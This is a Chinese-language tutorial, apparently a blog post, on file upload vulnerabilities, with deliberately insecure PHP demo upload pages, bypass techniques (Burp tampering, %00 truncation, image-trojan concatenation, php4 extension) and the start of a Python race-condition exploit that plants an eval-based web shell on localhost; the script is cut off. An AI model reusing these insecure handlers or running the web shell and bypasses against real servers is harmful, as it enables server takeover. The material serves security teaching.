title="文件上传漏洞"></a>文件上传漏洞</h3><p>如果能把文件上传到管理员或者应用程序不想让你上传的目录,那么就存在文件上传漏洞。</p><p>一般的检测流程:</p><ul><li>客户端javascript校验（一般只校验文件的扩展名）</li><li>服务端校验<ul><li>文件头content-type字段校验（image&#x2F;gif）</li><li>文件内容头校验（GIF89a）</li><li>目录路经检测（检测跟Path参数相关的内容）</li><li>文件扩展名检测 (检测跟文件 extension 相关的内容)</li><li>后缀名黑名单校验</li><li>后缀名白名单校验</li><li>自定义正则校验</li></ul></li><li>WAF设备校验（根据不同的WAF产品而定）</li></ul><p>利用函数:</p><ul><li>move_uploaded_file</li></ul><h3 id="客户端校验"><a href="#客户端校验" class="headerlink" title="客户端校验"></a>客户端校验</h3><p>jsupload.php (test on php 5.5.38)</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">//文件上传漏洞演示脚本之js验证</span><br><span class="hljs-variable">$uploaddir</span> = <span class="hljs-string">&#x27;uploads/&#x27;</span>;<br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;submit&#x27;</span>])) &#123;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">file_exists</span>(<span class="hljs-variable">$uploaddir</span>)) &#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">move_uploaded_file</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upfile&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>], <span class="hljs-variable">$uploaddir</span> . <span class="hljs-string">&#x27;/&#x27;</span> . <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upfile&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>])) &#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;文件上传成功，保存于：&#x27;</span> . <span class="hljs-variable">$uploaddir</span> . <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upfile&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>] . <span class="hljs-string">&quot;\n&quot;</span>;<br>        &#125;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">exit</span>(<span class="hljs-variable">$uploaddir</span> . <span class="hljs-string">&#x27;文件夹不存在,请手工创建！&#x27;</span>);<br>    &#125;<br>    <span class="hljs-comment">//print_r($_FILES);</span><br>&#125;<br><span class="hljs-meta">?&gt;</span><br>&lt;!DOCTYPE html PUBLIC <span class="hljs-string">&quot;-//W3C//DTD XHTML 1.0 Transitional//EN&quot;</span><br><br>    <span class="hljs-string">&quot;http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd&quot;</span>&gt;<br>&lt;html xmlns=<span class="hljs-string">&quot;http://www.w3.org/1999/xhtml&quot;</span>&gt;<br>&lt;head&gt;<br>    &lt;meta http-equiv=<span class="hljs-string">&quot;Content-Type&quot;</span> content=<span class="hljs-string">&quot;text/html;charset=gbk&quot;</span>/&gt;<br>    &lt;meta http-equiv=<span class="hljs-string">&quot;content-language&quot;</span> content=<span class="hljs-string">&quot;zh-CN&quot;</span>/&gt;<br>    &lt;title&gt;文件上传漏洞演示脚本--JS验证实例&lt;/title&gt;<br>    &lt;script type=<span class="hljs-string">&quot;text/javascript&quot;</span>&gt;<br>        <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">checkFile</span>(<span class="hljs-params"></span>) </span>&#123;<br>            <span class="hljs-keyword">var</span> file = document.<span class="hljs-title function_ invoke__">getElementsByName</span>(<span class="hljs-string">&#x27;upfile&#x27;</span>)[<span class="hljs-number">0</span>].value;<br>            <span class="hljs-keyword">if</span> (file == <span class="hljs-literal">null</span> || file == <span class="hljs-string">&quot;&quot;</span>) &#123;<br>                <span class="hljs-title function_ invoke__">alert</span>(<span class="hljs-string">&quot;你还没有选择任何文件，不能上传!&quot;</span>);<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>            &#125;<br>            <span class="hljs-comment">//定义允许上传的文件类型</span><br>            <span class="hljs-keyword">var</span> allow_ext = <span class="hljs-string">&quot;.jpg|.jpeg|.png|.gif|.bmp|&quot;</span>;<br>            <span class="hljs-comment">//提取上传文件的类型</span><br>            <span class="hljs-keyword">var</span> ext_name = file.<span class="hljs-title function_ invoke__">substring</span>(file.<span class="hljs-title function_ invoke__">lastIndexOf</span>(<span class="hljs-string">&quot;.&quot;</span>));<br>            <span class="hljs-comment">//alert(ext_name);</span><br>            <span class="hljs-comment">//alert(ext_name + &quot;|&quot;);</span><br>            <span class="hljs-comment">//判断上传文件类型是否允许上传</span><br>            <span class="hljs-keyword">if</span> (allow_ext.<span class="hljs-title function_ invoke__">indexOf</span>(ext_name + <span class="hljs-string">&quot;|&quot;</span>) == -<span class="hljs-number">1</span>) &#123;<br>                <span class="hljs-keyword">var</span> errMsg = <span class="hljs-string">&quot;该文件不允许上传，请上传&quot;</span> + allow_ext + <span class="hljs-string">&quot;类型的文件,当前文件类型为：&quot;</span> + ext_name;<br>                <span class="hljs-title function_ invoke__">alert</span>(errMsg);<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>            &#125;<br>        &#125;<br>    &lt;/script&gt;<br>&lt;body&gt;<br>&lt;h3&gt;文件上传漏洞演示脚本--JS验证实例&lt;/h3&gt;<br><br><br>&lt;form action=<span class="hljs-string">&quot;&quot;</span> method=<span class="hljs-string">&quot;post&quot;</span> enctype=<span class="hljs-string">&quot;multipart/form-data&quot;</span> name=<span class="hljs-string">&quot;upload&quot;</span> onsubmit=<span class="hljs-string">&quot;return checkFile()&quot;</span>&gt;<br>    &lt;input type=<span class="hljs-string">&quot;hidden&quot;</span> name=<span class="hljs-string">&quot;MAX_FILE_SIZE&quot;</span> value=<span class="hljs-string">&quot;204800&quot;</span>/&gt;<br>    请选择要上传的文件：&lt;input type=<span class="hljs-string">&quot;file&quot;</span> name=<span class="hljs-string">&quot;upfile&quot;</span>/&gt;<br>    &lt;input type=<span class="hljs-string">&quot;submit&quot;</span> name=<span class="hljs-string">&quot;submit&quot;</span> value=<span class="hljs-string">&quot;上传&quot;</span>/&gt;<br>&lt;/form&gt;<br>&lt;/body&gt;<br>&lt;/html&gt;<br></code></pre></td></tr></table></figure><p><code>http://127.0.0.1/jsupload.php</code></p><p>判断方式：<br>在浏览加载文件，但还未点击上传按钮时便弹出对话框，(进一步确定可以通过配置浏览器HTTP代理（没有流量经过代理就可以证明是客户端JavaScript检测））内容如：只允许传.jpg&#x2F;.jpeg&#x2F;.png后缀名的文件，而此时并没有发送数据包。</p><p>绕过方法：<br>将需要上传的恶意代码文件类型改为允许上传的类型，例如将shell.asp改为shell.jpg上传，配置Burp Suite代理进行抓包，然后再将文件名shell.jpg改为shell.asp<br>上传页面，审查元素，修改JavaScript检测函数（具体方法：可以使用firebug之类的插件把它禁掉）</p><h3 id="服务端检测"><a href="#服务端检测" class="headerlink" title="服务端检测"></a>服务端检测</h3><h4 id="MIME类型检测"><a href="#MIME类型检测" class="headerlink" title="MIME类型检测"></a>MIME类型检测</h4><p>MIME的作用：使客户端软件，区分不同种类的数据，例如web浏览器就是通过MIME类型来判断文件是GIF图片，还是可打印的PostScript文件。web服务器使用MIME来说明发送数据的种类， web客户端使用MIME来说明希望接收到的数据种类。</p><p>eg:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;file&#x27;</span>][<span class="hljs-string">&#x27;type&#x27;</span>] != <span class="hljs-string">&quot;image/jpg&quot;</span>)<br>&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Sorry, we only allow uploading GIF images&quot;</span>;<br>    <span class="hljs-keyword">exit</span>;<br>&#125;<br><span class="hljs-variable">$uploaddir</span> = <span class="hljs-string">&#x27;./uploads/&#x27;</span>;<br><span class="hljs-variable">$uploadfile</span> = <span class="hljs-variable">$uploaddir</span> . <span class="hljs-title function_ invoke__">basename</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>]);<br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">move_uploaded_file</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>], <span class="hljs-variable">$uploadfile</span>))<br>&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;File is valid, and was successfully uploaded.\n&quot;</span>;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;File uploading failed.\n&quot;</span>;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br><br>&lt;!DOCTYPE html PUBLIC <span class="hljs-string">&quot;-//W3C//DTD XHTML 1.0 Transitional//EN&quot;</span><br><br>    <span class="hljs-string">&quot;http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd&quot;</span>&gt;<br>&lt;html xmlns=<span class="hljs-string">&quot;http://www.w3.org/1999/xhtml&quot;</span>&gt;<br>&lt;head&gt;<br>    &lt;meta http-equiv=<span class="hljs-string">&quot;Content-Type&quot;</span> content=<span class="hljs-string">&quot;text/html;charset=gbk&quot;</span>/&gt;<br>    &lt;meta http-equiv=<span class="hljs-string">&quot;content-language&quot;</span> content=<span class="hljs-string">&quot;zh-CN&quot;</span>/&gt;<br>&lt;body&gt;<br><br><br>&lt;form action=<span class="hljs-string">&quot;&quot;</span> method=<span class="hljs-string">&quot;post&quot;</span> enctype=<span class="hljs-string">&quot;multipart/form-data&quot;</span> name=<span class="hljs-string">&quot;upload&quot;</span>&gt;<br>    &lt;input type=<span class="hljs-string">&quot;hidden&quot;</span> name=<span class="hljs-string">&quot;MAX_FILE_SIZE&quot;</span> value=<span class="hljs-string">&quot;204800&quot;</span>/&gt;<br>    请选择要上传的文件：&lt;input type=<span class="hljs-string">&quot;file&quot;</span> name=<span class="hljs-string">&quot;upfile&quot;</span>/&gt;<br>    &lt;input type=<span class="hljs-string">&quot;submit&quot;</span> name=<span class="hljs-string">&quot;submit&quot;</span> value=<span class="hljs-string">&quot;上传&quot;</span>/&gt;<br>&lt;/form&gt;<br>&lt;/body&gt;<br>&lt;/html&gt;<br></code></pre></td></tr></table></figure><p>绕过方法:<br>配置Burp Suite代理进行抓包，将Content-Type修改为image&#x2F;gif，或者其他允许的类型</p><h4 id="扩展名检测"><a href="#扩展名检测" class="headerlink" title="扩展名检测"></a>扩展名检测</h4><p>黑名单检测:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getExt</span>(<span class="hljs-params"><span class="hljs-variable">$filename</span></span>)</span>&#123;<br>    <span class="hljs-comment">//sunstr - 返回字符串的子串</span><br>    <span class="hljs-comment">//strripos — 计算指定字符串在目标字符串中最后一次出现的位置（不区分大小写）</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$filename</span>,<span class="hljs-title function_ invoke__">strripos</span>(<span class="hljs-variable">$filename</span>,<span class="hljs-string">&#x27;.&#x27;</span>)+<span class="hljs-number">1</span>);<br>&#125;<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>][<span class="hljs-string">&quot;error&quot;</span>] &gt; <span class="hljs-number">0</span>)<br>&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Error: &quot;</span> . <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>][<span class="hljs-string">&quot;error&quot;</span>] . <span class="hljs-string">&quot;&lt;br /&gt;&quot;</span>;<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-variable">$black_file</span> = <span class="hljs-title function_ invoke__">explode</span>(<span class="hljs-string">&quot;|&quot;</span>,<span class="hljs-string">&quot;php|jsp|asp&quot;</span>);<span class="hljs-comment">//允许上传的文件类型组</span><br>    <span class="hljs-variable">$new_upload_file_ext</span> = <span class="hljs-title function_ invoke__">strtolower</span>(<span class="hljs-title function_ invoke__">getExt</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>][<span class="hljs-string">&quot;name&quot;</span>])); <span class="hljs-comment">//取得被.隔开的最后字符串</span><br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$new_upload_file_ext</span>,<span class="hljs-variable">$black_file</span>))<br>    &#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;文件不合法&quot;</span>;<br>        <span class="hljs-keyword">die</span>();<br>    &#125;<br>    <span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-variable">$filename</span> = <span class="hljs-title function_ invoke__">basename</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>]).<span class="hljs-string">&quot;.&quot;</span>.<span class="hljs-variable">$new_upload_file_ext</span>;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">move_uploaded_file</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>],<span class="hljs-string">&quot;uploads/&quot;</span>.<span class="hljs-variable">$filename</span>))<br>        &#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Upload Success&quot;</span>;<br>        &#125;<br>    &#125;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br><br>&lt;!DOCTYPE html PUBLIC <span class="hljs-string">&quot;-//W3C//DTD XHTML 1.0 Transitional//EN&quot;</span><br><br>    <span class="hljs-string">&quot;http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd&quot;</span>&gt;<br>&lt;html xmlns=<span class="hljs-string">&quot;http://www.w3.org/1999/xhtml&quot;</span>&gt;<br>&lt;head&gt;<br>    &lt;meta http-equiv=<span class="hljs-string">&quot;Content-Type&quot;</span> content=<span class="hljs-string">&quot;text/html;charset=gbk&quot;</span>/&gt;<br>    &lt;meta http-equiv=<span class="hljs-string">&quot;content-language&quot;</span> content=<span class="hljs-string">&quot;zh-CN&quot;</span>/&gt;<br>&lt;body&gt;<br><br><br>&lt;form action=<span class="hljs-string">&quot;&quot;</span> method=<span class="hljs-string">&quot;post&quot;</span> enctype=<span class="hljs-string">&quot;multipart/form-data&quot;</span> name=<span class="hljs-string">&quot;upload&quot;</span>&gt;<br>    &lt;input type=<span class="hljs-string">&quot;hidden&quot;</span> name=<span class="hljs-string">&quot;MAX_FILE_SIZE&quot;</span> value=<span class="hljs-string">&quot;204800&quot;</span>/&gt;<br>    请选择要上传的文件：&lt;input type=<span class="hljs-string">&quot;file&quot;</span> name=<span class="hljs-string">&quot;upfile&quot;</span>/&gt;<br>    &lt;input type=<span class="hljs-string">&quot;submit&quot;</span> name=<span class="hljs-string">&quot;submit&quot;</span> value=<span class="hljs-string">&quot;上传&quot;</span>/&gt;<br>&lt;/form&gt;<br>&lt;/body&gt;<br>&lt;/html&gt;<br></code></pre></td></tr></table></figure><p>apache服务器可能做了配置不会解析特殊扩展名<br>使用其他服务器复现(我使用的nginx),上传php4扩展名绕过黑名单<br><code>http://127.0.0.1/uploads/shell.php4</code></p><p>白名单检测:<br>仅允许指定的文件类型上传，比如仅与需上传jpg | gif | doc等类型的文件，其他全部禁止</p><p>绕过方法：</p><ul><li>文件名大小写绕过<ul><li>用像 AsP，pHp 之类的文件名绕过黑名单检测</li></ul></li><li>名单列表绕过<ul><li>用黑名单里没有的名单进行攻击，比如黑名单里没有 asa 或 cer 之类</li></ul></li><li>特殊文件名绕过<ul><li>比如发送的 http 包里把文件名改成 test.asp. 或 test.asp_(下划线为空格)，这种命名方式 在 windows 系统里是不被允许的，所以需要在 burp 之类里进行修改，然后绕过验证后，会被windows 系统自动去掉后面的点和空格，但要注意 Unix&#x2F;Linux 系统没有这个特性</li></ul></li><li>0x00截断<ul><li>文件名后缀就一个%00字节，可以截断某些函数对文件名的判断。在许多语言函数中处理函数中，处理字符串中(php版本需要小于5.3.4,magic_quotes_gpc&#x3D;Off)</li></ul></li></ul><h4 id="文件内容检测"><a href="#文件内容检测" class="headerlink" title="文件内容检测"></a>文件内容检测</h4><p>文件头检测:</p><ul><li>JPG: FF D8 FF E0 00 10 4A 46 49 46</li><li>GIF: 47 49 46 38 39 61 (GIF89a)</li><li>PNG: 89 50 4E 47<br>绕过方法:<br>添加头对应的文件头伪造</li></ul><p>文件相关信息检测:</p><ul><li>检查图片大小、尺寸等的信息。<br>绕过方法:<br>将代码注入到正常文件中(比如图片马:copy &#x2F;b 1.jpg+2.php)</li></ul><h4 id="竞争上传"><a href="#竞争上传" class="headerlink" title="竞争上传"></a>竞争上传</h4><p>当文件上传到服务器,先暂时保存,在检查是不是符合条件,如果不符合再删掉。<br>利用思路就是我们用多线程不断上传.php文件,在某个没有被删除的时刻如果访问到了.php文件,就生成一个shell,shell就会存到服务器。</p><p>eg:</p><p>competionupload.php(test on php 5.5.38)</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;submit&#x27;</span>])&#123;<br>    <span class="hljs-variable">$allowtype</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;gif&quot;</span>,<span class="hljs-string">&quot;png&quot;</span>,<span class="hljs-string">&quot;jpg&quot;</span>);<br>    <span class="hljs-variable">$size</span> = <span class="hljs-number">10000000</span>;<br>    <span class="hljs-variable">$path</span> = <span class="hljs-string">&quot;./uploads/&quot;</span>;<br>    <span class="hljs-variable">$filename</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">is_uploaded_file</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>]))&#123;<br>        <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">move_uploaded_file</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>],<span class="hljs-variable">$path</span>.<span class="hljs-variable">$filename</span>))&#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;error:can not move&quot;</span>);<br>        &#125;<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;error:not an upload file！&quot;</span>);<br>    &#125;<br>    <span class="hljs-variable">$newfile</span> = <span class="hljs-variable">$path</span>.<span class="hljs-variable">$filename</span>;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;file upload success.file path is: &quot;</span>.<span class="hljs-variable">$newfile</span>.<span class="hljs-string">&quot;\n&lt;br /&gt;&quot;</span>;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;file&#x27;</span>][<span class="hljs-string">&#x27;error&#x27;</span>]&gt;<span class="hljs-number">0</span>)&#123;<br>        <span class="hljs-title function_ invoke__">unlink</span>(<span class="hljs-variable">$newfile</span>);<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Upload file error: &quot;</span>);<br>    &#125;<br>    <span class="hljs-variable">$ext</span> = <span class="hljs-title function_ invoke__">array_pop</span>(<span class="hljs-title function_ invoke__">explode</span>(<span class="hljs-string">&quot;.&quot;</span>,<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>]));<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$ext</span>,<span class="hljs-variable">$allowtype</span>))&#123;<br>        <span class="hljs-title function_ invoke__">unlink</span>(<span class="hljs-variable">$newfile</span>);<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;error:upload the file type is not allowed，delete the file！&quot;</span>);<br>    &#125;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br><br><br>&lt;!DOCTYPE html PUBLIC <span class="hljs-string">&quot;-//W3C//DTD XHTML 1.0 Transitional//EN&quot;</span><br><br>    <span class="hljs-string">&quot;http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd&quot;</span>&gt;<br>&lt;html xmlns=<span class="hljs-string">&quot;http://www.w3.org/1999/xhtml&quot;</span>&gt;<br>&lt;head&gt;<br>    &lt;meta http-equiv=<span class="hljs-string">&quot;Content-Type&quot;</span> content=<span class="hljs-string">&quot;text/html;charset=gbk&quot;</span>/&gt;<br>    &lt;meta http-equiv=<span class="hljs-string">&quot;content-language&quot;</span> content=<span class="hljs-string">&quot;zh-CN&quot;</span>/&gt;<br>&lt;body&gt;<br><br><br>&lt;form action=<span class="hljs-string">&quot;&quot;</span> method=<span class="hljs-string">&quot;post&quot;</span> enctype=<span class="hljs-string">&quot;multipart/form-data&quot;</span> name=<span class="hljs-string">&quot;upload&quot;</span>&gt;<br>    &lt;input type=<span class="hljs-string">&quot;hidden&quot;</span> name=<span class="hljs-string">&quot;MAX_FILE_SIZE&quot;</span> value=<span class="hljs-string">&quot;204800&quot;</span>/&gt;<br>    请选择要上传的文件：&lt;input type=<span class="hljs-string">&quot;file&quot;</span> name=<span class="hljs-string">&quot;file&quot;</span>/&gt;<br>    &lt;input type=<span class="hljs-string">&quot;submit&quot;</span> name=<span class="hljs-string">&quot;submit&quot;</span> value=<span class="hljs-string">&quot;上传&quot;</span>/&gt;<br>&lt;/form&gt;<br>&lt;/body&gt;<br>&lt;/html&gt;<br></code></pre></td></tr></table></figure><p>exp.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> threading<br><span class="hljs-keyword">import</span> random<br><span class="hljs-keyword">import</span> string<br><br>exp_name = <span class="hljs-string">&#x27;&#x27;</span>.join(random.sample(string.ascii_letters + string.digits,<span class="hljs-number">10</span>))<br>shell_name = <span class="hljs-string">&#x27;&#x27;</span>.join(random.sample(string.ascii_letters + string.digits,<span class="hljs-number">10</span>))<br><br><span class="hljs-comment"># 按照自己的环境修改url</span><br>upload_url = <span class="hljs-string">&#x27;http://127.0.0.1/competionupload.php&#x27;</span><br>exp_url = <span class="hljs-string">&#x27;http://127.0.0.1/uploads/&#123;&#125;.php&#x27;</span>.<span class="hljs-built_in">format</span>(exp_name)<br>shell_url = <span class="hljs-string">&#x27;http://127.0.0.1/uploads/&#123;&#125;.php&#x27;</span>.<span class="hljs-built_in">format</span>(shell_name)<br><br>exp_content = (<span class="hljs-string">&#x27;&lt;?php fputs(fopen(&quot;&#123;&#125;.php&quot;, &quot;w&quot;), &#x27;</span><br>               <span class="hljs-string">&#x27;\&#x27;&lt;?php @eval($_POST[&quot;qqq&quot;]) ?&gt;\&#x27;); ?&gt;&#x27;</span>)<br>exp_content = exp_content.<span class="hljs-built_in">format</span>(shell_name)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">upload</span>():<br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;[+] upload file...&#x27;</span>)<br>        data = &#123;<span class="hljs-string">&#x27;submit&#x27;</span>:<span class="hljs-string">&#x27;上传&#x27;</span>&#125;<br>        files = &#123;<span class="hljs-string">&quot;file&quot;</span>:(<span class="hljs-string">&#x27;&#123;&#125;.php&#x27;</span>.<span class="hljs-built_in">format</span>(exp_name),exp_content)&#125;<br>        resp = requests.post(upload_url,files=files,data=data)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get</span>():<br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        